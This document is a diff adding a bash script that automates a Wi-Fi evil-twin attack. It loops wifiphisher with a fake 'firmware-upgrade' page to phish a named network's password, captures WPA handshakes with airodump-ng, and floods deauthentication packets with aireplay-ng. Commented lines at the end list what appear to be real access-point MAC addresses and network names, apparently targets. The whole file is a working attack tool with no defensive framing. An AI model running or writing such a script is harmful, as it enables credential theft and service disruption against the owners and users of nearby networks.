@@ -1,0 +1,68 @@
+#!/bin/bash
+echo "$(whoami)"
+[ "$UID" -eq 0 ] || exec sudo "$0" "$@"
+##sudo iw dev jam1 del ;
+##sleep 1
+##sudo iw dev wlp3s0b1mon1 del;
+##sleep 1
+##sudo airmon-ng stop mon0 ;
+##sleep 1
+##sudo airmon-ng stop wlp3s0b1 ;
+##sleep 1
+read -p 'essid:' essid
+while true; do
+sudo killall xterm ;
+sudo killall python2 ;
+sudo iw dev mon0 del ;
+sudo iw dev wlp3s0b1mon2 del ;
+sudo iw dev wlp3s0b1mon3 del ;
+sudo iw dev wlp3s0b1mon4 del ;
+sudo iw dev wlp3s0b1mon5 del ;
+sudo iw dev wlp3s0b1mon6 del ;
+sudo airmon-ng stop wlp3s0b1 ;
+sleep 1
+sudo service network-manager restart ;
+sleep 5
+bssid=$(nmcli -f BSSID,SSID,ACTIVE dev wifi list | grep "$essid" | awk '{print $1}')
+channel=$(nmcli -f CHAN,SSID,ACTIVE dev wifi list | grep "$essid" | awk '{print $1}')
+
+
+echo "$essid"
+echo "$bssid"
+echo "$channel"
+
+if [ -z "$channel" ] 
+then
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e "$essid" -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2/bin/wifiphisher -nJ -e \"$essid\" -p firmware-upgrade" &
+else
+sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e "$essid" -ch $channel -p firmware-upgrade
+sleep 1
+xterm -hold -e "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e \"$essid\" -ch "$channel" -p firmware-upgrade" &
+fi
+
+sleep 15
+xterm -hold -e "sudo airodump-ng wlp3s0b1mon3 --bssid "$bssid" --channel "$channel" -w \"/home/user/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/wifiphisher/handshakes/$essid\"" &
+sleep 1
+xterm -hold -e "while true ; do sudo aireplay-ng -q 15 -0 10 -a "$bssid" wlp3s0b1mon4 --ignore-negative-one ; sleep 30 ; done" &
+sleep 180
+done
+
+##sudo killall xterm ;
+##gnome-terminal --tab -x bash -c "echo $essid | sudo /home/user/Documents/Docs/2getmacr2" &
+##xterm -hold -e 'sh -c "sudo ~/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2r2/bin/wifiphisher -nJ -e "'$essid'" -ch "'$channel'" -p firmware-upgrade"' &
+##sleep 10
+##xterm -hold -e 'sh -c "while true; do sudo aireplay-ng -q 15 -0 10 -a "'$bssid'" wlp3s0b1mon4 --ignore-negative-one; sleep 30; done"' &
+##gnome-terminal -e \"sudo airodump-ng wlp3s0b1mon3 --bssid "+ap_mac+" -w \"/home/user/Documents/Docs/Linux/Kali/Tools/wifiphisher-1.2copy/wifiphisher/handshakes/"+essid+"\"\" &
+##gnome-terminal -e 'sh -c "while true; do sudo aireplay-ng -q 15 -0 10 -a "'$bssid'" wlp3s0b1mon4 --ignore-negative-one; sleep 30; done"'
+##-e "'$essid'"
+##-p firmware-upgrade
+##78:C1:A7:27:C1:76 ZTE_H268A27C176
+##TPG_PYW6
+##B8:08:D7:31:04:C0 
+##DODO-04B8
+##c8:51:95:50:f2:e4
+## TPG-X898
+##Skynet
+##C8:3A:35:73:CB:91
